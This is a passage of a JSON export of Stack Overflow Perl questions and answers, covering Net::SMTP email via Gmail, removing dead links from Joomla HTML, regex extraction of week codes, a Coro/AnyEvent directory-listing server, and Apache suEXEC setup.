"https://www.gravatar.com/avatar/cf9c670879bda154c4a0511859ba17b6?s=128&d=identicon&r=PG&f=1", "display_name": "jobeSW", "link": "https://stackoverflow.com/users/12476022/jobesw"}, "edited": false, "score": 0, "creation_date": 1577123410, "post_id": 59450186, "comment_id": 105100073, "body": "I just verified the script, the test email was delivered to my Gmail mailbox. Now I should ask you an obvious question: Did you put into the script proper $sender, $password, $receiver? <b>Note:</b> the script was tested under <b>Straberry Perl</b> (<a href=\"http://strawberryperl.com/\" rel=\"nofollow noreferrer\">strawberryperl.com</a>)."}, {"owner": {"reputation": 21, "user_id": 12476022, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cf9c670879bda154c4a0511859ba17b6?s=128&d=identicon&r=PG&f=1", "display_name": "jobeSW", "link": "https://stackoverflow.com/users/12476022/jobesw"}, "edited": false, "score": 0, "creation_date": 1577153818, "post_id": 59450186, "comment_id": 105106958, "body": "Reinstalled the latest Strawberry Perl I&#39;m still not getting anything from this script, if i comment out [SSL=&gt;1,] and add [Port =&gt; 587,] it prints [Trying to authenticate..] but nothing after the authentication line not even the fail code or any prints i add after there.  I think google needs SSL but somehow my system is failing when calling it, or blocking ports, though i am able to get to google smtp through my sendmail setup I see it uses port 587 and probably TLS..  i tried installing Net::SMTP::TLS but it fails [could not expand Net::SMTP::TLS]."}, {"owner": {"reputation": 4234, "user_id": 12313309, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/3fPDo.jpg?s=128&g=1", "display_name": "Polar Bear", "link": "https://stackoverflow.com/users/12313309/polar-bear"}, "reply_to_user": {"reputation": 21, "user_id": 12476022, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cf9c670879bda154c4a0511859ba17b6?s=128&d=identicon&r=PG&f=1", "display_name": "jobeSW", "link": "https://stackoverflow.com/users/12476022/jobesw"}, "edited": false, "score": 0, "creation_date": 1577154551, "post_id": 59450186, "comment_id": 105107052, "body": "What debug output information from script states? There should be <i>MAIL CODES</i>, have you looked what they mean? Are you sure that sent email did not get into <b>spam</b> folder?"}], "tags": [], "owner": {"reputation": 4234, "user_id": 12313309, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/3fPDo.jpg?s=128&g=1", "display_name": "Polar Bear", "link": "https://stackoverflow.com/users/12313309/polar-bear"}, "is_accepted": false, "score": 1, "last_activity_date": 1577075459, "creation_date": 1577075459, "answer_id": 59450186, "question_id": 59447106, "link": "https://stackoverflow.com/questions/59447106/how-to-write-an-netsmtp-email-in-perl/59450186#59450186", "title": "How to write an Net::SMTP email in perl", "body": "<p>Try the following code (it requires Authen::SASL module which might be not part of your setup)</p>\n\n<pre><code>use strict;\nuse warnings;\nuse utf8;\n\nuse Net::SMTP 3.0;\nuse Authen::SASL qw(Perl);\n\nmy $sender = my $user = 'your_id@gmail.com';\nmy $password = 'your_password';\nmy $receiver = 'your_receiver@gmail.com';\n\nmy $smtp = Net::SMTP-&gt;new(\n    'smtp.gmail.com',\n    SSL=&gt;1,\n    Timeout =&gt; 20,\n    Debug   =&gt; 1,\n);\n\ndie \"Initialization failed: $!\" if !defined $smtp;\n\nprint \"Trying to authenticate..\";\n$smtp-&gt;auth( $user, $password) or die \"could not authenticate\\n\";\n\nmy $header = \n\"To: $receiver\nFrom: $sender\nContent-Type: text/html\nSubject: Testing Net::SMTP\n\n\";\n\nmy $body = \"\nThe &lt;i&gt;body&lt;/i&gt; of the &lt;b&gt;email&lt;/b&gt; Net-SMTP example\n\";\n\n$smtp-&gt;mail( $sender );\n$smtp-&gt;to( $receiver );\n$smtp-&gt;data();\n$smtp-&gt;datasend( $header );\n$smtp-&gt;datasend( $body );\n$smtp-&gt;datasend( '' );\n$smtp-&gt;dataend();\n$smtp-&gt;quit();\n</code></pre>\n"}], "owner": {"reputation": 21, "user_id": 12476022, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cf9c670879bda154c4a0511859ba17b6?s=128&d=identicon&r=PG&f=1", "display_name": "jobeSW", "link": "https://stackoverflow.com/users/12476022/jobesw"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 626, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1577075459, "creation_date": 1577040202, "last_edit_date": 1577043667, "question_id": 59447106, "link": "https://stackoverflow.com/questions/59447106/how-to-write-an-netsmtp-email-in-perl", "title": "How to write an Net::SMTP email in perl", "body": "<p>None of my hosts have any higher email modules, so I'd prefer to get this working without additional modules.</p>\n\n<p>I've tried using google smtp servers (which i got working with \\sendmail in XAMPP but never through Net::SMTP), I've tried secureserver.net smtp servers.  with and without SSL, with and without Hello lines, port 465 or 25.  Tried running from my local XAMPP server disabled all firewalls, tried running it remotely on goDaddy server.  </p>\n\n<p>Seems to be timing out and 'smtp failed'.  never getting to '...' even without the <em>unless($smtp)</em> test.  failing to get past auth, but since 'smtp failed' is being fired i assume its a problem with how i am forming the initial declaration of the object?  Though I've tried this in several different ways and I'm not getting any actual server errors.</p>\n\n<pre><code>my $smtp = Net::SMTP-&gt;new($smtpserver,\n    SSL =&gt; 1,                   \n    Timeout =&gt; 60,\n    Port =&gt; $smtpport,  # tried 25 and 465\n    Debug =&gt; 1\n);\n    unless($smtp) { #tried with and without this\n        print \"smtp failed&lt;br&gt;[\".$!.\"]&lt;br&gt;and&lt;br&gt;\".$IO::Socket::SSL::SSL_ERROR;\n    }\n$smtp-&gt;auth($smtpuser, $smtppassword);    #nothing under this line is done\n$smtp-&gt;mail($smtpuser);            #but i have checked and double checked the data\n$smtp-&gt;recipient($recipi);         #pointed to several email addys but never arrive\n$smtp-&gt;data();\n$smtp-&gt;datasend(\"From: $smtpuser\");\n$smtp-&gt;datasend(\"To: $recipi\");\n$smtp-&gt;datasend(\"Subject: test mail ver six sm loc 12\"); \n$smtp-&gt;datasend(\"\\n\");\n$smtp-&gt;datasend(\"blah blah\");\n$smtp-&gt;dataend();\n$smtp-&gt;quit;\nprint\"...\";  #never gets printed\n</code></pre>\n\n<p>Any suggestions welcome, the only thing I've thought of and <em>not</em> tried is including the authentication in the initial object deceleration, i can find no where that shows how to do that.</p>\n\n<p>edit; added <em>$! and $IO::Socket::SSL::SSL_ERROR</em> Steffen suggested the result is $! = [Bad file descriptor] and $IO::Socket::SSL::SSL_ERROR returns nothing.</p>\n"}, {"tags": ["perl", "uri"], "answers": [{"comments": [{"owner": {"reputation": 349, "user_id": 1834498, "user_type": "registered", "accept_rate": 36, "profile_image": "https://www.gravatar.com/avatar/82c4a126c67bc0d736a42980c96f5ad0?s=128&d=identicon&r=PG", "display_name": "Alex Regan", "link": "https://stackoverflow.com/users/1834498/alex-regan"}, "edited": false, "score": 0, "creation_date": 1577038169, "post_id": 59446189, "comment_id": 105076364, "body": "Would you describe a bit more about what that&#39;s doing? What should I adjust &quot;/non-existant/ to be? I&#39;m not sure of its purpose. Do I substitute my article ($ref-&gt;{fulltext}) for the &lt;body&gt; text you have in your new() example?"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 349, "user_id": 1834498, "user_type": "registered", "accept_rate": 36, "profile_image": "https://www.gravatar.com/avatar/82c4a126c67bc0d736a42980c96f5ad0?s=128&d=identicon&r=PG", "display_name": "Alex Regan", "link": "https://stackoverflow.com/users/1834498/alex-regan"}, "edited": false, "score": 0, "creation_date": 1577038475, "post_id": 59446189, "comment_id": 105076444, "body": "You would pass the HTML you want to modify to <code>Mojo::DOM-&gt;new</code>. I passed a hardcoded string as a demonstration"}], "tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 2, "last_activity_date": 1577038563, "last_edit_date": 1577038563, "creation_date": 1577033325, "answer_id": 59446189, "question_id": 59446049, "link": "https://stackoverflow.com/questions/59446049/perl-scanning-body-text-for-uris-and-remove-using-urifindsimple/59446189#59446189", "title": "Perl: Scanning body text for URIs and remove using URI::Find::Simple", "body": "<p>You can use something like this:</p>\n\n<pre><code>use strict;\nuse warnings;\n\nuse Mojo::DOM qw( );\n\nsub check_url {\n   my ($url) = @_;\n\n   # Replace with code to check of the URL is reachable.\n   return $url !~ /non-existant/;\n}\n\n# From your database or whatever.\nmy $html = '\n   &lt;body&gt;\n       &lt;p&gt;&lt;a href=\"http://www.google.com/\"&gt;Google&lt;/a&gt;&lt;/p&gt;\n       &lt;p&gt;&lt;a href=\"http://www.non-existant.com/\"&gt;Bad&lt;/a&gt;&lt;/p&gt;\n   &lt;/body&gt;\n';\n\nmy $dom = Mojo::DOM-&gt;new($html);\n\nfor my $ele ($dom-&gt;find('a[href]')-&gt;each) {\n   my $url = $ele-&gt;attr('href');\n   if (!check_url($url)) {\n      delete $ele-&gt;attr-&gt;{href};\n   }\n}\n\n$html = \"$dom\";    \n\nprint $html;  # Do whatever you want with the modified HTML.\n</code></pre>\n"}], "owner": {"reputation": 349, "user_id": 1834498, "user_type": "registered", "accept_rate": 36, "profile_image": "https://www.gravatar.com/avatar/82c4a126c67bc0d736a42980c96f5ad0?s=128&d=identicon&r=PG", "display_name": "Alex Regan", "link": "https://stackoverflow.com/users/1834498/alex-regan"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 50, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1577038563, "creation_date": 1577032253, "question_id": 59446049, "link": "https://stackoverflow.com/questions/59446049/perl-scanning-body-text-for-uris-and-remove-using-urifindsimple", "title": "Perl: Scanning body text for URIs and remove using URI::Find::Simple", "body": "<p>I'm trying to scan the article text in a joomla database for URIs that result in a 404. If a 404 is found, remove the anchor and just leave the resulting text.</p>\n\n<p>The code below succeeds in locating the URIs, but I have no idea how to then strip them out of the body text, leaving just the text portion of the link.</p>\n\n<p>The fetch_body() function returns a pointer to the article, where the id, fulltext, and other characteristics can be accessed.</p>\n\n<p>I've also experimented with HTTP::Tiny to download the URL and check the status and it appears to work properly.</p>\n\n<p>Is there an existing module I can use to strip the URL, leaving only the text? Can URI::Find:Simple be used to return the entire HTML (anchor?) surrounding the URI?</p>\n\n<p>I don't know what more information I can provide to help me determine what to do next.</p>\n\n<pre><code>  foreach my $ref (fetch_body($dbh)) {\n     print \"checking body: $ref-&gt;{'id'} \";\n     my @uris     = URI::Find::Simple::list_uris($ref-&gt;{fulltext});\n     foreach my $uri (@uris) {\n        print \"current uri: $uri\\n\";\n        # check uri for status code here ***\n        my $response = HTTP::Tiny-&gt;new-&gt;get($url);\n        if ($response-&gt;{success}) {\n             print \"status: $response-&gt;{'status'}\\n\";\n        } else {\n             print \"Failed: $response-&gt;{status} $response-&gt;{reasons}\\n\";\n        }\n     }\n  }\n</code></pre>\n\n<p>These other two functions just open the database and return a pointer to the article in the joomla database.</p>\n\n<pre><code>  sub db_connect() {\n  my %DB        = (\n    'host'  =&gt; 'db.example.com',\n    'db'    =&gt; 'db5',\n    'user'  =&gt; 'joomla',\n    'pass'  =&gt; 'joomlapass',\n   );\n\n   return DBI-&gt;connect(\"DBI:mysql:database=$DB{'db'};host=$DB{'host'}\",$DB{'user'}, $DB{'pass'});\n   }\n\n   sub fetch_body ($) {\n   $dbh  = shift;\n\n   my $sql       = \"select id, title, alias, urls, \\`fulltext\\`\n                 FROM xxx_content\n                WHERE state     = 1\";\n   my $sth       = $dbh-&gt;prepare($sql);\n   my @rv        = ();\n\n   $sth-&gt;execute();\n\n   while (my $ref = $sth-&gt;fetchrow_hashref()) {\n      push @rv, $ref;\n   }\n   $sth-&gt;finish();\n   return @rv;\n   }\n</code></pre>\n"}, {"tags": ["regex", "perl"], "comments": [{"owner": {"reputation": 79972, "user_id": 298607, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/DVW9g.jpg?s=128&g=1", "display_name": "dawg", "link": "https://stackoverflow.com/users/298607/dawg"}, "edited": false, "score": 0, "creation_date": 1576960001, "post_id": 59439561, "comment_id": 105062928, "body": "Is the <code>79</code> and <code>week</code> always there? If so, fairly easy to do <code>&#47;79week(\\d\\d)([a-zA-Z])&#47;</code> <a href=\"https://regex101.com/r/8OR9NA/1/\" rel=\"nofollow noreferrer\">Demo</a>"}, {"owner": {"reputation": 478, "user_id": 7484043, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c553310d1ad27e031be3aefb8127db4f?s=128&d=identicon&r=PG&f=1", "display_name": "programminglearner", "link": "https://stackoverflow.com/users/7484043/programminglearner"}, "reply_to_user": {"reputation": 79972, "user_id": 298607, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/DVW9g.jpg?s=128&g=1", "display_name": "dawg", "link": "https://stackoverflow.com/users/298607/dawg"}, "edited": false, "score": 0, "creation_date": 1576961829, "post_id": 59439561, "comment_id": 105063248, "body": "@dawg please check post edit"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1576961855, "post_id": 59439561, "comment_id": 105063255, "body": "<code>my ($week) = $file1 =~ &#47;-[0-9]{2}(week[0-9]{2}[a-zA-Z])-&#47;;</code>"}], "answers": [{"tags": [], "owner": {"reputation": 7444, "user_id": 967621, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zOso6.jpg?s=128&g=1", "display_name": "Timur Shtatland", "link": "https://stackoverflow.com/users/967621/timur-shtatland"}, "is_accepted": false, "score": 0, "last_activity_date": 1576961443, "last_edit_date": 1576961443, "creation_date": 1576960878, "answer_id": 59439691, "question_id": 59439561, "link": "https://stackoverflow.com/questions/59439561/perl-matching-part-of-string/59439691#59439691", "title": "Perl Matching Part of String", "body": "<pre><code>my ( $week ) = $file1 =~ m{ ( week \\d\\d [A-Za-z] ) }x;\n</code></pre>\n\n<p>Here, <code>x</code> flag is for readability and causes to ignore white space and comments. If the week number can have one or two digits, use <code>\\d{1,2}</code>. </p>\n\n<p>I also recommend to use more descriptive variables than <code>$fileN</code>, or use an array such as <code>@file_names</code>. </p>\n"}, {"tags": [], "owner": {"reputation": 17225, "user_id": 2823719, "user_type": "registered", "accept_rate": 11, "profile_image": "https://i.stack.imgur.com/TWgf9.jpg?s=128&g=1", "display_name": "Booboo", "link": "https://stackoverflow.com/users/2823719/booboo"}, "is_accepted": true, "score": 1, "last_activity_date": 1576964155, "last_edit_date": 1576964155, "creation_date": 1576961314, "answer_id": 59439731, "question_id": 59439561, "link": "https://stackoverflow.com/questions/59439561/perl-matching-part-of-string/59439731#59439731", "title": "Perl Matching Part of String", "body": "<p><strong>General Observation:</strong></p>\n\n<p>If <code>$file</code> contains a string such as:</p>\n\n<p><code>/mypath/sd-urt7-dfc-adfj345h-d0-79week48a-DFC-lk-my.text</code>,</p>\n\n<p>then if you execute:</p>\n\n<p><code>$file  =~ /79(week\\d+[a-z])/i;</code></p>\n\n<p>variable <code>$1</code>, which is set to the Group 1 match from the above regex, will contain (in the above example):</p>\n\n<p><code>week48a</code></p>\n\n<p>You can then assign <code>my $week = $1;</code></p>\n\n<p>I hope that answers you Regex-related question.</p>\n\n<p>Your statement:</p>\n\n<p><code>my ($week) = $file =~ /79week(\\d\\d)([a-zA-Z])/;</code></p>\n\n<p>will only set <code>$week</code> to Group 1, or <code>48</code>. So the other alternative, would be:</p>\n\n<p><code>my ($week) = $file =~ /79(week\\d\\d[a-zA-Z])/;</code></p>\n"}], "owner": {"reputation": 478, "user_id": 7484043, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c553310d1ad27e031be3aefb8127db4f?s=128&d=identicon&r=PG&f=1", "display_name": "programminglearner", "link": "https://stackoverflow.com/users/7484043/programminglearner"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 87, "favorite_count": 0, "accepted_answer_id": 59439731, "answer_count": 2, "score": 2, "last_activity_date": 1576964155, "creation_date": 1576959475, "last_edit_date": 1576961817, "question_id": 59439561, "link": "https://stackoverflow.com/questions/59439561/perl-matching-part-of-string", "title": "Perl Matching Part of String", "body": "<p>I would like to grab the date portion out of file paths so I may use them in a file name. For example, the files may be of the format:</p>\n\n<pre><code>$file1 = \"/mypath/sd-urt7-dfc-adfj345h-d0-79week48a-DFC-lk-my.text\"  \n$file2 = \"/mypath/sd-urt7-afd-parent-79week46d-AFD-lk-my.text\"  \n$file3 = \"/mypath/sd-urt7-ert-parent-79week50c-ERT-lk-my.text\"  \n</code></pre>\n\n<p>Regardless of the file name formats from above, there is a portion in there that has the format \"79weekxxX\" where xx is a week number and X is a letter. I want to grab the portion \"weekxxX\" from each of these string names in order to create a final file name with just this string. For example, if my file is <code>$file1</code>, then I would like to store it in another variable such as week which contains <code>week48a</code> and create another variable just called <code>$filename=\"$week.txt\"</code>.</p>\n\n<p>I'm thinking regex matching can be used to do this but I'm not quite sure how. Please let me know if any part of my question remains unclear so that I may further elaborate. Thank you.</p>\n\n<p>Edit:\nThe \"79week\" is always there. To be exact, I will not be accessing them as variables with file names. The paths are values of a nested hash for its own corresponding keys. So would it work to do something like:</p>\n\n<pre><code> my %hash = ( \n        \"rev\" =&gt; {\n            \"first\" =&gt; \"$filepath1\",  \n            \"second\" =&gt; \"$filepath2\", \n            \"third\" =&gt; \"$filepath3\"                      \n        },  \n        \"for\" =&gt; {\n            \"first\" =&gt; \"$filepath1_2\",  \n            \"second\" =&gt; \"$filepath2_2\", \n            \"third\" =&gt; \"$filepath3_2\" \n        }   \n    );\n\nforeach my $inner (keys %{$hash{$outer}}){\nmy $file = basename($inner); //only takes the file name, and ignores the rest of the path\nmy ($week) = $file =~ /79week(\\d\\d)([a-zA-Z])/;\n$filename = \"$week.txt\";\n}\n</code></pre>\n"}, {"tags": ["multithreading", "perl", "anyevent"], "answers": [{"tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": true, "score": 1, "last_activity_date": 1576975933, "last_edit_date": 1576975933, "creation_date": 1576973385, "answer_id": 59440765, "question_id": 59438559, "link": "https://stackoverflow.com/questions/59438559/perl-multithreaded-server-with-coro-and-anyevent/59440765#59440765", "title": "Perl: multithreaded server with Coro and AnyEvent", "body": "<p>The thread exits when <code>handle_request</code> exits, so you want to wrap the body of <code>handle_request</code> in an infinite loop.</p>\n\n<p>You also want to use <code>Coro::schedule;</code> instead of <code>Coro::cede;</code> to wait for <code>-&gt;ready</code> to be called again before continuing.</p>\n\n<p>That first loop in <code>handle_request</code> can be reduced to <code>my $thread = $pool[$thread_id];</code>.</p>\n\n<p>Untested fix:</p>\n\n<pre><code>sub handle_request {\n   my ($thread_id) = @_;\n   my $thread = $pool[$thread_id];\n\n   while (1) {\n      my $self       = $thread-&gt;client;\n      my $client_key = $thread-&gt;clt_key;\n      my $dir_list   = $thread-&gt;args;\n\n      ...\n\n      $thread-&gt;is_busy(0);\n      Coro::schedule();\n   }\n}\n</code></pre>\n\n<hr>\n\n<p>That said, the following is the approach I'd use:</p>\n\n<pre><code>use Coro;\nuse Coro::Channel;\n\nuse constant NUM_WORKERS =&gt; 16;\n\nsub worker {\n   my ($job) = @_;\n\n   my $self       = $job-&gt;client;\n   my $client_key = $job-&gt;clt_key;\n   my $dir_list   = $job-&gt;args;\n\n   ...\n}\n\n{\n   my $q = Coro::Channel-&gt;new();\n\n   my @threads =\n      map {\n         async {\n            while ( my $job = $q-&gt;get() ) {\n               eval { worker($job); 1 }\n                  or warn $@;\n            }\n         }\n      }\n         1..NUM_WORKERS;\n\n   ...\n   on_read =&gt; sub {\n      my ($self) = @_;\n      $q-&gt;put({\n         client  =&gt; $self,\n         clt_key =&gt; $client_key,\n         args    =&gt; $self-&gt;rbuf,\n      });\n   }\n   ...\n\n   $cv-&gt;recv;\n   $q-&gt;shutdown;\n   $_-&gt;join for @threads;\n}\n</code></pre>\n\n<p>This is the same approach I'd use with real threads (using Thread::Queue instead of Coro::Channel).</p>\n"}], "owner": {"reputation": 13, "user_id": 12570556, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/43729d52b2ed3f3ba91f1e2fab5da912?s=128&d=identicon&r=PG&f=1", "display_name": "NRogo", "link": "https://stackoverflow.com/users/12570556/nrogo"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 123, "favorite_count": 0, "accepted_answer_id": 59440765, "answer_count": 1, "score": 1, "last_activity_date": 1576975933, "creation_date": 1576951005, "question_id": 59438559, "link": "https://stackoverflow.com/questions/59438559/perl-multithreaded-server-with-coro-and-anyevent", "title": "Perl: multithreaded server with Coro and AnyEvent", "body": "<p>I am a newbie in Perl, so in educational purposes I am developing multithreaded server using AnyEvent and Coro. The client sends to server list of directory paths and server responses with listing of these directories.</p>\n\n<p>I am using tcp_server and AnyEvent::Handle for connections handling, and for each client I want server to check thread pool (which is actually pool of coros) for free coro to handle request. When handling request is finished, I want coro to wait for another client instead of finishing.</p>\n\n<p>However, it seems like at the end of handle_request sub, coro is destroyed and not avaliable anymore.  </p>\n\n<pre class=\"lang-perl prettyprint-override\"><code>#!/usr/bin/perl\n\nuse strict;\nuse v5.18;\n\nuse AnyEvent;                           \nuse AnyEvent::Socket qw(tcp_server);    \nuse AnyEvent::Handle;                  \n\nuse Coro;\n\nuse Class::Struct;\n\nprint(\"Server is running...\\n\");\n\n# dirs function\n\nsub print_dirs {\n\n    my $dir_list = $_[0];\n    my @dirs = split(\" \", $dir_list);\n    my $result = \"\";\n\n    for my $dir (@dirs) {\n        if (opendir my $dirent, $dir) {\n            my @files = readdir $dirent;\n            closedir $dirent;\n            $result = $result . \"\\nContents of $dir:\\r\\n\" . join(\"\\r\\n\", @files) . \"\\r\\n\";\n        } else {\n            $result = $result . \"Failed to open $dir: $!\\r\\n\";\n        }\n    }\n\n    return $result;\n}\n\n# thread struct\nstruct clt_thread =&gt; {\n    id =&gt; '$',\n    thread =&gt; '$',\n    is_busy =&gt; '$',\n    args =&gt; '$',\n    client =&gt; '$',\n    clt_key =&gt; '$'\n};\n\nmy $threads_num = 16;\nmy $thread_id = 0;\nmy @pool = ();\n\n# handling request\n\nmy $cv = AE::cv;\nmy %client = ();\n\nsub handle_request {\n\n        my $thread_id = shift;\n        my $thread;\n        foreach my $thr (@pool) {\n            if ($thr-&gt;id == $thread_id) { $thread = $thr; }\n        }\n        my $self = $thread-&gt;client;\n        my $client_key = $thread-&gt;clt_key;\n        my $dir_list = $thread-&gt;args;\n        if ($thread-&gt;client != '') {\n\n            say \"Directories read: \" . $dir_list . \"\\n\";\n            my @clients = keys %client;\n\n            for my $key (grep {$_ ne $client_key} @clients) {\n                my $response = print_dirs($dir_list);\n                $client{$key}-&gt;push_write(\"$response\");\n                $self-&gt;push_shutdown;\n                delete $client{$client_key};\n                delete $client{$self};\n            }\n\n        }\n        $thread-&gt;is_busy(0);\n        Coro::cede();\n}\n\n# threads creation\n\nfor my $i (0..$threads_num) {\n    my $coro = new Coro(\\&amp;handle_request, $thread_id);\n    my $thread = clt_thread-&gt;new(id =&gt; $thread_id, thread =&gt; $coro, is_busy =&gt; 0, args =&gt; '', client =&gt; '', clt_key =&gt; '');\n    push @pool, $thread;\n    $thread_id = $thread_id+1;\n}\n\n# tcp server creation - main part\n\ntcp_server '127.0.0.1', 8015, sub {\n\n    my ($fh, $host, $port) = @_;\n    my $client_key = \"$host:$port\";\n\n    my $hdl = AnyEvent::Handle-&gt;new(\n            fh =&gt; $fh,\n            poll =&gt; 'r',\n            on_read =&gt; sub {\n                    my ($self) = @_;\n\n                    foreach my $thr (@pool) {\n                        if (!($thr-&gt;is_busy)) {\n                        $thr-&gt;client($self);\n                        $thr-&gt;args($self-&gt;rbuf); \n                        $thr-&gt;clt_key($client_key);\n                        $thr-&gt;is_busy(1);\n                        $thr-&gt;thread-&gt;ready();\n                        return;\n                        }   \n                    }\n            },\n            on_error =&gt; sub {\n                say \"Something went wrong: $!\\n\";\n            },\n    );\n\n    $client{$client_key} = $hdl;\n    $client{$hdl} = $hdl;\n};\n\n$cv-&gt;recv;\n\n</code></pre>\n\n<p>I have already tried using infinite loop inside handle_request, but this way everything stops working at all. Do you have any ideas how to fix that? I suppose using Coro::AnyEvent to integrate coroutines into event loop might be solution. Can it be helpful in my case?</p>\n\n<p>Thans for your help.</p>\n"}, {"tags": ["perl", "centos7", "httpd.conf", "suexec"], "owner": {"reputation": 389, "user_id": 2644315, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/5AWB7.jpg?s=128&g=1", "display_name": "Xerix", "link": "https://stackoverflow.com/users/2644315/xerix"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 382, "favorite_count": 0, "answer_count": 0, "score": 2, "last_activity_date": 1576943848, "creation_date": 1576920932, "last_edit_date": 1576943848, "question_id": 59435077, "link": "https://stackoverflow.com/questions/59435077/proper-working-with-suexec-on-apache-httpd-2-4", "title": "Proper working with suexec on apache httpd 2.4", "body": "<p>I am trying to run 3 separated domains in one machine, each with its user (through virtual host) so I decided to use suExec for my task (it been also installed along with apache):</p>\n\n<p>Global Server configuration running on \"apache\" user and group.</p>\n\n<p>The conficuration of one of the users (the one I am trying to access with):</p>\n\n<pre><code>listen 9999\n&lt;VirtualHost *:9999&gt;\n        ServerName *:9999\n        DocumentRoot \"/home/efpanel/public_html\"\n        ErrorLog \"/home/efpanel/err.log\"\n        &lt;IfModule suexec_module&gt;\n#               SuexecUserGroup efpanel efpanel\n        &lt;/IfModule&gt;\n        # Directory settings...\n        ...\n\n        &lt;IfModule alias_module&gt;\n                ScriptAlias /cgi-bin/ \"/home/efpanel/public_html/cgi-bin/\"\n        &lt;/IfModule&gt;\n&lt;/VirtualHost&gt;\n</code></pre>\n\n<p><b>The issue: </b><br>\nWhen the line of the SuexecUserGroup is commented, running perl script will be on user \"apache\" - not what I want, but at least run. <br>\nHOWEVER: If I uncomment this line, even simple perl script will fail with error 500 (internal server error). Checking the log file, the error I get there is:</p>\n\n<pre><code>[Sat Dec 21 01:34:56.274872 2019] [cgi:error] [pid 31211] [client 183.28.7.14:7262] End of script output before headers: test.cgi, referer: http://99.99.99.99:9999/\n</code></pre>\n\n<p><b>Notes:</b><br>\n1) mod_suexec is installed and enabled (the below is the result of \"ls -l /usr/sbin | grep suexec\"):</p>\n\n<pre><code>-r-x--x--- 1 root apache  15440 Aug  8 07:42 suexec\n</code></pre>\n\n<p><br>\n2) I am running Apache 2.4 httpd on CentOS 7, CGI written in PERL.<br>\n3) I am aware that suEXEC only work on script files, but is enough for me - if I make it somehow to work.<br>\n4) Checking the configuration values, I cannot determine where is the suexec log file, and was unable to find it by \"find / suexec.log\" command. The configuration values are as follows (seems standard):</p>\n\n<pre><code>[root@vps cgi-bin]# suexec -V\n -D AP_DOC_ROOT=\"/var/www\"\n -D AP_GID_MIN=100\n -D AP_HTTPD_USER=\"apache\"\n -D AP_LOG_SYSLOG\n -D AP_SAFE_PATH=\"/usr/local/bin:/usr/bin:/bin\"\n -D AP_UID_MIN=500\n -D AP_USERDIR_SUFFIX=\"public_html\"\n</code></pre>\n\n<p>My only concern here is the \"DOC_ROOT\" which is \"/var/www\" and has anything common with \"/home/efpanel\" - but: a) I have no idea how to reconfigure suexec after it been compiled, b) I don't think it is that necessary, maybe it is ok \"as is\"?<br>\n5) cgi script, cgi-bin directory, public_html directory and /home/efpanel directory are all belong to the same user and group (efpanel) and has access permit of 0755, except \"/home/efpanel\" that has 0711 access permit.<br>\n6) I have tried to add \"-w\" in the first line of the script, as suggested <a href=\"https://encodable.com/suexec_problems/\" rel=\"nofollow noreferrer\">here</a>:</p>\n\n<pre><code>#!/usr/bin/perl -w\n\nmy $u=(getpwuid $&gt;)[0];\nprint \"ContentType: text/html;\\n\\n$u\";\n\nexit 0;\n</code></pre>\n\n<p>As it seen, a VERY simple script and fail.</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 1, "creation_date": 1576865762, "post_id": 59429638, "comment_id": 105045290, "body": "What is that &quot;<i>scanning tool</i>&quot;? What does its &quot;<i>vulnerable</i>&quot; mean?  The one thing that <i>is</i> missing is to check whether the <code>open</code> call succeeded, commonly <code>open ...  or die &quot;Can&#39;t open $file: $!&quot;;</code>"}, {"owner": {"reputation": 5193, "user_id": 5996587, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/d15f53deb1b5f2cab3534565c91c5394?s=128&d=identicon&r=PG&f=1", "display_name": "codec", "link": "https://stackoverflow.com/users/5996587/codec"}, "reply_to_user": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": 